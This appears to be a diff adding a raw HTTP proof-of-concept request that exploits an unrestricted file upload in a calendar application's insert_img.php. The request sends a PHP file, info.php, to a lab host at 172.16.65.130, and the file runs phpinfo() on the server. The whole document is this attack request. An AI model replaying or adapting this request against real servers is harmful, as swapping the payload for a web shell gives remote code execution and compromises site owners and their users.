@@ -1,0 +1,24 @@
+POST /calendar/insert_img.php?upload=file HTTP/1.1
+Host: 172.16.65.130
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.65.130/calendar/insert_img.php
+Content-Type: multipart/form-data; boundary=---------------------------204215667519428971331549130662
+Content-Length: 367
+Connection: close
+Cookie: PHPSESSID=4nh4k36v9q7adcl200usdqga96
+Upgrade-Insecure-Requests: 1
+
+-----------------------------204215667519428971331549130662
+Content-Disposition: form-data; name="userfile"; filename="info.php"
+Content-Type: application/x-php
+
+<?php phpinfo(); ?>
+
+-----------------------------204215667519428971331549130662
+Content-Disposition: form-data; name="url"
+
+http://
+-----------------------------204215667519428971331549130662--
